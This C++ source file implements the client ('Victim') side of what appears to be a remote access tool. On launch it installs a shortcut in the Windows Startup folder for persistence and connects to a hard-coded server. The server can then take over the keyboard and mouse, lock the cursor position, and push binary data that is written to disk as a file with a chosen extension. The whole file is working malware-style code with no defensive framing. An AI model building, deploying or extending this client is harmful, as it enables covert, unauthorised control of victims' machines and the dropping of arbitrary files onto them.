#include "victim.h"

Victim::Victim()
{    
    //release all keys
    for (int i = 0; i < 256; i++)
        keysStates[i] = false;

    wchar_t buf[256];
    int bytes = GetModuleFileNameW(NULL, buf, sizeof(buf));
    std::wstring path(buf);
    std::string tempPath = "";
    for (auto c : path)
        tempPath += char(c);
    exePath = tempPath.substr(0, tempPath.find_last_of('\\'));
    exeName = tempPath.substr(tempPath.find_last_of('\\') + 1);

    //if needed create the context file
    std::ofstream createFile(exePath + "\\vcontext.txt", std::ios::app);
    createFile.close();
    //read the context file
    std::ifstream readFile(exePath + "\\vcontext.txt");
    getline(readFile, name);

    //remove spaces before and after name
    while (name.size() > 0 && name[0] == ' ')
        name.erase(name.begin());
    while (name.size() > 0 && name[name.size() - 1] == ' ')
        name.erase(name.begin() + name.size() - 1);
    readFile.close();

    PWSTR start;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
        std::wstring lnkPath = std::wstring(start) + L"\\" + std::wstring(exeName.begin(), exeName.end()) + L".lnk";
        //free the allocated memory
        CoTaskMemFree(start);

        if (SUCCEEDED(CoInitialize(NULL))) {
            IShellLink* pShellLink = NULL;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_ALL, IID_IShellLink, (void**)&pShellLink))) {
                pShellLink->SetPath(path.c_str());
                pShellLink->SetIconLocation(path.c_str(), 0);
                IPersistFile* pPersistFile;
                pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
                pPersistFile->Save(lnkPath.c_str(), TRUE);
                pPersistFile->Release();   
            }
            pShellLink->Release();
        }
        CoUninitialize();
    }

    //connect and initialize connection with server
    connectServer();

    //start the thread that keeps the victim connected
    std::thread keepAwake(&Victim::keepAwake, this);
    keepAwake.detach();
}

int Victim::controlVictim()
{
    while (isRunning) {
        sf::Packet p;
        server.receive(p);

        //if the packet is invalid reconnect with the server
        if (p.getDataSize() == 0) {
            std::cout << "DISCONNECTED FROM SERVER\n";
            isConnected = false, controlMouse = false, controlKeyboard = false;
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i])
                    continue;
                keysStates[i] = false;

                //if its a mouse key, treat it accordingly
                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }
            connectServer();
        }

        sf::Uint8 cmd;
        p >> cmd;
        
        //exit program
        if (cmd == 'e') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i])
                    continue;
                keysStates[i] = false;

                //if its a mouse key, treat it accordingly
                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }
            isRunning = false;
        }
        //key pressed-released
        else if (cmd == 'n' || cmd == 'm') {
            sf::Uint8 vkc;
            p >> vkc;

            bool state = (cmd == 'n');
            keysStates[vkc] = state;

            //if its a mouse key, treat it accordingly
            if ((vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06) && controlMouse)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
            else if (controlKeyboard)
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
        }
        //mouse moved
        else if (cmd == 'l') {
            sf::Uint16 a, b;
            p >> a >> b;
            float x = a / (256.f * 256.f) * screenSize.x;
            float y = b / (256.f * 256.f) * screenSize.y;
            if (controlMouse)
                mousePos = Mlib::Vec2i(x, y);
        }
        //wheel scrolled
        else if (cmd == 'k') {
            sf::Int8 delta;
            p >> delta;
            Mlib::Mouse::simulateScroll(delta * 100.f);
        }
        //start/stop controlling keyboard
        else if (cmd == 'a' || cmd == 'z') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i] || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    continue;
                keysStates[i] = false;

                Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }

            if (cmd == 'a')
                controlKeyboard = true;
            else
                controlKeyboard = false;
        }
        //start/stop controlling keyboard
        else if (cmd == 's' || cmd == 'x') {
            for (int i = 0; i < 7; i++) {
                if (!keysStates[i] || !(i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06))
                    continue;
                keysStates[i] = false;

                Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
            }
            if (cmd == 's')
                controlMouse = true;
            else
                controlMouse = false;
        }
        //rename client
        else if (cmd == 'w') {
            p >> name;
            //write the new name in the context file
            std::ofstream file(exePath + "\\vcontext.txt", std::ios::trunc);
            file.write(name.c_str(), name.size());
            file.close();
        }
        //apparently victim isn't initialized
        else if (cmd == '?') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i])
                    continue;
                keysStates[i] = false;

                //if its a mouse key, treat it accordingly
                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }

            //connect and initialize again
            isConnected = false, controlMouse = false, controlKeyboard = false;
            connectServer();
        }
        //create new file
        else if (cmd == 'f') {
            if (file != nullptr) {
                file->close();
                delete file;
                file = nullptr;

                p.clear();
                p << sf::Uint8('h');
                sendServer(p);

                continue;
            }

            std::thread newFile(&Victim::createNewFile, this);
            newFile.detach();
        }
        //write file
        else if (cmd == 'o') {
            if (file == nullptr) {
                p.clear();
                p << sf::Uint8('h');
                sendServer(p);

                continue;
            }
            else if (file->bad()) {
                file->close();
                delete file;
                file = nullptr;

                p.clear();
                p << sf::Uint8('h');
                sendServer(p);

                continue;
            }

            const void* buffer = p.getData();
            auto data = static_cast<const char*>(buffer);
            ++data;
            size_t size = p.getDataSize() - 1;
            file->write(data, size);

            p.clear();
            p << sf::Uint8('y');
            sendServer(p);
        }
        //close file
        else if (cmd == 'i') {
            if (file == nullptr) {
                p.clear();
                p << sf::Uint8('h');
                sendServer(p);

                continue;
            }
            else if (file->bad()) {
                file->close();
                delete file;
                file = nullptr;

                p.clear();
                p << sf::Uint8('h');
                sendServer(p);

                continue;
            }

            std::string ext;
            p >> ext;

            file->close();
            delete file;
            file = nullptr;

            std::string newName = filePath + ext;
            std::rename(filePath.c_str(), newName.c_str());
        }
        //file fail
        else if (cmd == 'h') {
            if (file == nullptr)
                continue;

            file->close();
            delete file;
            file = nullptr;
        }
    }

    return 0;
}
void Victim::keepAwake()
{
    while (true) {
        //every 2 seconds send a signal to the server so not to be flagged asleep
        if (isConnected && Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
            sf::Packet p;
            p << sf::Uint8('r');
            sendServer(p);
            lastAwakeSignal = Mlib::currentTime().asMil();
        }
        //sleep to save computing power
        Mlib::sleep(Mlib::milliseconds(50));
    }
}

void Victim::connectServer()
{
connect:
    //connect to server
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
    std::cout << "connected with server\n";

init:
    sf::Packet p;
    p << sf::Uint8('v') << name;
    //tell server the role and the name
    if (sendServer(p) == sf::Socket::Disconnected)
        goto connect;

    p.clear();
    if (server.receive(p) == sf::Socket::Disconnected)
        goto connect;
    sf::Uint8 role = '-';
    //check if the server has initialized the victim, else try again
    p >> role;
    if (role != 'v')
        goto init;
    //get the connection id
    std::cout << "connection with server approved\n";

    isConnected = true;

    std::thread pinMouse(&Victim::pinMouse, this);
    pinMouse.detach();
}
void Victim::createNewFile()
{
    filePath = Mlib::getSaveFilePath("All Files (*.*)\0*.*\0");
    if (filePath == "") {
        sf::Packet p;
        p << sf::Uint8('h');
        sendServer(p);
        return;
    }

    std::string loc = filePath.substr(0, filePath.find_last_of('\\'));
    std::string name = filePath.substr(filePath.find_last_of('\\'), filePath.size() - 1);
    name = name.substr(0, name.find_first_of('.'));

    filePath = loc + name;
    if (filePath == "") {
        sf::Packet p;
        p << sf::Uint8('h');
        sendServer(p);
        return;
    }
    file = new std::ofstream(filePath, std::ios::binary | std::ios::out);
    if (file->bad()) {
        sf::Packet p;
        p << sf::Uint8('h');
        sendServer(p);
        return;
    }

    sf::Packet p;
    p << sf::Uint8('y');
    sendServer(p);
}
void Victim::pinMouse()
{
    while (true) {
        if (controlMouse)
            Mlib::Mouse::setPos(mousePos);
        Mlib::sleep(Mlib::milliseconds(1));
    }
}
sf::Socket::Status Victim::sendServer(sf::Packet& p)
{
    mutex.lock();
    auto state = server.send(p);
    mutex.unlock();
    return state;
}
